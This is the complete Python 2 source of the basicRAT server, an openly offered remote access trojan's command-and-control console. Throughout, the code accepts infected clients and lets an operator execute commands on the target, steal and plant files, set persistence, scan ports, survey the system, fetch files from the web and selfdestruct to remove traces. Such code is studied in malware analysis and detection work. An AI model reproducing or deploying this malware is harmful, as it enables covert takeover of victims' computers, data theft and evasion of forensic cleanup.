#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import sys
import threading
import time

from core import common, crypto


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
client <id>         - Connect to a client.
clients             - List connected clients.
download <file>     - Download a file.
execute <command>   - Execute a command on the target.
help                - Show this help menu.
kill                - Kill the client connection.
persistence         - Apply persistence mechanism.
quit                - Exit the server and end all client connections.
scan <ip>           - Scan top 25 TCP ports on a single host.
selfdestruct        - Remove all traces of the RAT from the target system.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <file>       - Upload a file.
wget <url>          - Download a file from the web.'''
COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
             'unzip', 'upload', 'wget' ]


class Server(threading.Thread):
    clients      = {}
    alive        = True
    client_count = 1

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            client_id = self.client_count
            client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except (KeyError, ValueError):
            return None

    # order is not retained. maybe use SortedDict here
    def get_clients(self):
        return [v for k,v in self.clients.iteritems() if v.alive]

    def remove_client(self, key):
        return self.clients.pop(key, None)


class ClientConnection(common.Client):
    alive = True

    def send(self, prompt):
        if not self.alive:
            print 'Error: Client not connected.'
            return

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # selfdestruct rat
        if cmd == 'selfdestruct':
            if raw_input('Remove all traces of basicRAT from the target ' \
                         'system (y/N)? ').startswith('y'):
                print 'Running selfdestruct...'
                self.sendGCM(prompt)
                self.conn.close()
            return

        # send prompt to client
        self.sendGCM(prompt)
        self.conn.settimeout(1)

        # kill client connection
        if cmd == 'kill':
            self.conn.close()

        # download a file
        elif cmd == 'download':
            self.recvfile(action.rstrip())

        # send file
        elif cmd == 'upload':
            self.sendfile(action.rstrip())

        # regenerate DH key
        # elif cmd == 'rekey':
        #     self.dh_key = crypto.diffiehellman(self.conn)

        # results of execute, persistence, scan, survey, unzip, or wget
        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
            print 'Running {}...'.format(cmd)
            recv_data = self.recvGCM().rstrip()
            print recv_data


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    client  = None

    # print banner all sexy like
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'basicRAT server listening for connections on port {}.'.format(port)

    while True:
        try:
            promptstr = '\n[{}] basicRAT> '.format(client.uid)
        except AttributeError:
            promptstr = '\n[{}] basicRAT> '.format('?')

        prompt = raw_input(promptstr).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        # display help text
        if cmd == 'help':
            print HELP_TEXT

        # stop the server
        elif cmd == 'quit':
            if raw_input('Exit the server and end all client connections ' \
                         '(y/N)? ').startswith('y'):
                # gracefull kill all clients here
                sys.exit(0)

        # select client
        elif cmd == 'client':
            new_client = server.select_client(action)
            if new_client:
                client = new_client
                print 'Client {} selected.'.format(client.uid)
            else:
                print 'Error: Invalid Client ID'

        # list clients
        elif cmd == 'clients':
            print 'ID - Client Address'
            for k in server.get_clients():
                print '{:>2} - {}'.format(k.uid, k.addr[0])

        # continue loop for above commands
        if cmd in ['client', 'clients', 'help', 'quit']:
            continue

        # require client id
        if not client:
            print 'Error: Invalid client ID.'
            continue

        # send prompt to client connection handler
        try:
            client.send(prompt)
        except (socket.error, ValueError) as e:
            print e
            print 'Client {} disconnected.'.format(client.uid)
            cmd = 'kill'

        # reset client id if client killed
        if cmd in ['kill', 'selfdestruct']:
            server.remove_client(client.uid)
            client = None


if __name__ == '__main__':
    main()
